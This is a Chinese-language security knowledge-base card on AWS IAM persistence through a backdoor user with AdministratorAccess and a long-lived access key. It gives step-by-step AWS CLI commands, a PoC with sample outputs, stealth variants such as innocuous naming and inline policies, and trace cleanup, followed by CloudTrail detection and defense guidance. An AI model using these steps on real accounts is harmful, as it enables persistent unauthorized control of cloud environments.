---
id: cloud-cloud-iam-aws-backdoor-user-key-persistence
title: AWS 后门身份自建：create-user + attach-user-policy AdministratorAccess + create-access-key 形成独立于原凭证轮换的持久管理员 AK
type: scenario
domain: cloud
path: cloud/cloud-iam
technique: aws-backdoor-user-access-key-persistence
tags:
- cloud
- aws
- iam
- persistence
- backdoor
- access-key
- privilege-escalation
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-W4
  verified_at: '2026-11-08T13:50:19+08:00'
  notes: 已对照原文核对 create-user backdor、attach-user-policy AdministratorAccess、create-access-key 返回结构、list-attached-user-policies 验证输出均与原文 CLI 实录一致；未验证点：不受原凭证轮换影响、list-access-keys 可见性与 permissions boundary/SCP、每用户 2 把 key 配额等属作者补充的 AWS 机制推论，原文未直接陈述；原文账户 ID 已脱敏为占位符。
url: /docs/cloud/cloud-iam/cloud-cloud-iam-aws-backdoor-user-key-persistence/
draft: false
kb_aliases:
- AWS 后门用户
- create-user backdoor
- 后门 Access Key
- IAM 持久化
- AdministratorAccess 附加用户
- aws iam create-access-key 后门
---

## 一句话结论

拿到一个高权限 AWS 凭据后，最省事的持久化是**新建一个自己的身份**而不是动现有用户：`aws iam create-user --user-name <后门名>` → `aws iam attach-user-policy --user-name <后门名> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess` → `aws iam create-access-key --user-name <后门名>`，得到的长期 AK/SK 直接拥有管理员权限；它独立于原账号的密钥，受害者轮换/禁用最初泄露的那把 key 时这个后门只要没被枚举出来就仍然有效。

## 原理

- IAM 用户是长期身份，`create-access-key` 生成的 AK/SK 没有过期时间（与 STS 临时凭证不同），因此「新建用户 + 附加管理员策略 + 建 key」得到的是一个**不受原凭证生命周期影响**的持久后门。
- 为什么选「新建」而不是「给已有用户加 key」：给管理员用户加 key 会出现在该用户的 access key 列表里，管理员一看 `list-access-keys` 就会发现多了一把；新建用户则要主动 `list-users` 才看得到，而多数应急只检查「已知用户/已知 key 是否泄露」，不一定逐个用户回看。
- 阶梯：新建用户默认无任何权限（`attach-user-policy` 之前它对任何 API 都是 `AccessDenied`），所以必须附加策略；`AdministratorAccess` 是 AWS 托管策略，arn 固定为 `arn:aws:iam::aws:policy/AdministratorAccess`，附加即得管理员。
- 验证动作 `aws iam list-attached-user-policies --user-name <后门名>` 能确认策略真的挂上了；这一步也常被攻击者用来「确认后门可用」。
- 长期 key 的风险面：AK/SK 一旦落入日志、截图、CI 变量或本地配置文件就长期可用；AWS 侧不会因为「原用户被删」而失效——除非后门用户本身被删或策略被摘。
- 边界：目标若启用了 permissions boundary、SCP 或组织级策略，新建用户可能继承不了管理员（`AdministratorAccess` 会被 boundary 截断）；账号的 IAM 用户数/access key 数有配额上限，`create-access-key` 可能因达到上限（每用户 2 把）失败，此时需先 `delete-access-key` 或改用现有用户。

## 触发条件

- 攻击者已持有具备 `iam:CreateUser`、`iam:AttachUserPolicy`、`iam:CreateAccessKey` 的凭据（或被授予 `AdministratorAccess` 的高权限凭据）。
- 目标账号未对 IAM 变更做强制审批，也未限制「新建用户 + 附加管理员策略」这类组合动作。
- 账号未达到 IAM 用户数/每用户 access key 配额。
- 攻击者能保存后门 AK/SK（本地文件、密码管理器、自己的 C2 配置）。

## 利用步骤

1. 确认当前身份与权限：`aws sts get-caller-identity`、`aws iam list-users`（看现有用户，避免撞名）。
2. 建后门用户：`aws iam create-user --user-name backdor`，记下返回的 `Arn`。
3. 附加管理员策略：`aws iam attach-user-policy --user-name backdor --policy-arn arn:aws:iam::aws:policy/AdministratorAccess`。
4. 生成长期密钥：`aws iam create-access-key --user-name backdor`，保存 `AccessKeyId` 与 `SecretAccessKey`（Secret 只返回一次）。
5. 验证：`aws iam list-attached-user-policies --user-name backdor` 确认 `AdministratorAccess` 已挂；用后门 key 走一次 `aws sts get-caller-identity` 确认身份切换成功。
6. 清理痕迹（可选）：删除/停用本次使用的初始凭据之外的多余 key，避免留下第二条线索；后门 key 单独保存。

## PoC

```bash
# 1) 侦察现有用户，避免重名
aws iam list-users

# 2) 新建后门用户（默认无任何权限）
aws iam create-user --user-name backdor
# => {"User":{"UserName":"backdor","Arn":"arn:aws:iam::<acct>:user/backdor", ...}}

# 3) 直接附加 AWS 托管管理员策略
aws iam attach-user-policy --user-name backdor \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# 4) 生成长期访问密钥（SecretAccessKey 只返回一次）
aws iam create-access-key --user-name backdor
# => {"AccessKey":{"UserName":"backdor","AccessKeyId":"...","Status":"Active","SecretAccessKey":"..."}}

# 5) 确认后门权限已生效
aws iam list-attached-user-policies --user-name backdor
# => {"AttachedPolicies":[{"PolicyName":"AdministratorAccess","PolicyArn":"arn:aws:iam::aws:policy/AdministratorAccess"}]}
```

## 变体与关联

- 变体：不附加托管策略而用 `put-user-policy` 写内联策略（更隐蔽，避免 `AdministratorAccess` 这个显眼 ARN 出现在 attach 记录里）。
- 变体：把后门用户放进一个「看起来正常」的路径/命名（如 `ci-deploy`、`monitoring`），降低人工巡检时的注意力。
- 变体：附加 `iam:CreateAccessKey` 等次级权限而不是完全管理员，降低被权限审计抓到的概率（但能力也降级）。
- 变体：如果账号禁止新建用户，退化为「给已有低频用户创建第二把 key」或「改其登录密码」（见关联卡）。
- 关联：[[cloud-cloud-iam-aws-dangerous-permission-privesc]]（同一批 IAM 动作的提权视角；本条是持久化视角，强调「新建独立身份」与「不受原 key 轮换影响」）、[[cloud-cloud-iam-aws-backdoor-role-assume-role-persistence]]（角色版持久化）、[[cloud-cloud-iam-workload-role-policy-selfcheck]]（先确认自己是否有这些动作）。
- 边界：permissions boundary/SCP 会让新建用户拿不到管理员；access key 配额（每用户 2 把）可能让 `create-access-key` 失败；账号若启用「IAM 用户禁止控制台登录 + 仅角色」策略，后门用户可能无法使用某些依赖控制台的能力。

## 检测与防御

- 检测：CloudTrail 对 `CreateUser`、`AttachUserPolicy`、`CreateAccessKey` 三个事件做关联告警——尤其「新建用户后几分钟内就被附加 `AdministratorAccess` 并立刻生成 key」的组合，是本后门最典型的时序特征。
- 检测：定期对账 IAM 用户清单与基线（新增用户、非基线用户持有 `AdministratorAccess`、其 key 的 `CreateDate` 与用户 `CreateDate` 同一天）。
- 检测：监控非预期来源 IP/ASN 使用某个 AK 调用高权限 API；对 `CreateAccessKey` 后紧接 `sts:GetCallerIdentity` 的「验证式调用」也值得关注。
- 防御：最小权限，禁止普通身份持有 `iam:CreateUser`/`iam:AttachUserPolicy`/`iam:CreateAccessKey` 组合；用 permissions boundary 与 SCP 限制「新身份的权限上限」。
- 防御：对 `iam:AttachUserPolicy` 加条件（禁止附加 `AdministratorAccess`），对敏感 IAM 变更走人工审批；开启 MFA、限制 AK 数量并强制轮换；定期跑「非基线管理员」巡检。
- 应急：发现后门用户后，先 `delete-access-key` 停用其 key、再 `detach-user-policy` 摘策略、最后 `delete-user` 删身份，并审查该身份的 CloudTrail 全部历史动作。
